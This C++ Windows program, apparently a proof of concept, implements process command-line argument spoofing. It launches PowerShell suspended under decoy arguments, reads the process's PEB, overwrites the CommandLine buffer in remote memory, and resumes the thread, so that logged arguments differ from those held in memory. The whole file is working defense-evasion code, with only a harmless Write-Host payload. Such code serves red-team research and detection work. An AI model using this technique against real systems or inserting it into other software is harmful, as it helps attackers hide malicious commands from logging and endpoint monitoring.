#include <iostream>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(*NtQueryInformationProcess2) (
    IN HANDLE,
    IN PROCESSINFOCLASS,
    OUT PVOID,
    IN ULONG,
    OUT PULONG
    );

void* read_process_memory(HANDLE process, void* address, DWORD bytes) {
    SIZE_T bytes_read = 0;
    char* alloc = NULL;

    alloc = (char*)malloc(bytes);
    if (alloc == NULL) {
        return NULL;
    }

    if (ReadProcessMemory(process, address, alloc, bytes, &bytes_read) == 0) {
        free(alloc);
        return NULL;
    }
    return alloc;
}

BOOL write_process_memory(HANDLE process, void* address, void* data, DWORD bytes) {
    SIZE_T bytes_written = 0;
    
    if (WriteProcessMemory(process, address, data, bytes, &bytes_written) == 0) {
        return false;
    }
    return true;
}

int main()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT context;
    BOOL ret;
    PROCESS_BASIC_INFORMATION pbi;
    DWORD ret_len;
    SIZE_T bytes_read;
    PEB peb;
    RTL_USER_PROCESS_PARAMETERS* parameters;

    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));

    ret = CreateProcessA(
        NULL,
        (LPSTR)"powershell -NoExit -c Write-Host 'Nothing to see here'",
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        "C:\\Windows\\System32\\",
        &si,
        &pi
    );

    if (ret == FALSE) {
        printf("[!] CreateProcessA failed.\n");
        return -1;
    }

    HMODULE ntdll_lib = LoadLibraryA("ntdll.dll");
    if (ntdll_lib == NULL) {
        printf("[!] LoadLibrary failed.\n");
        return -1;
    }

    NtQueryInformationProcess2 ntqueryinformationprocess = (NtQueryInformationProcess2)GetProcAddress(
        ntdll_lib, "NtQueryInformationProcess"
    );

    if (ntqueryinformationprocess == NULL) {
        printf("[!] GetProcAddress failed.\n");
        return -1;
    }
    
    ntqueryinformationprocess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &ret_len
    );

    // Read the PEB
    ret = ReadProcessMemory(
        pi.hProcess,
        pbi.PebBaseAddress,
        &peb,
        sizeof(PEB),
        &bytes_read
    );

    if (ret == FALSE) {
        printf("[!] ReadProcessMemory failed.\n");
        return -1;
    }

    // Extract the ProcessParameters from the PEB
    parameters = (RTL_USER_PROCESS_PARAMETERS*)read_process_memory(
        pi.hProcess,
        peb.ProcessParameters,
        sizeof(PRTL_USER_PROCESS_PARAMETERS) + 300
    );

    WCHAR spoofed[] = L"powershell.exe -NoExit -c Write-Host Arguments spoofed!\0";
    ret = write_process_memory(
        pi.hProcess,
        parameters->CommandLine.Buffer,
        (void*)spoofed,
        sizeof(spoofed)
    );

    if (ret == FALSE) {
        printf("[!] WriteProcessMemory failed.\n");
        return -1;
    }

    ResumeThread(pi.hThread);
    return 0;
}
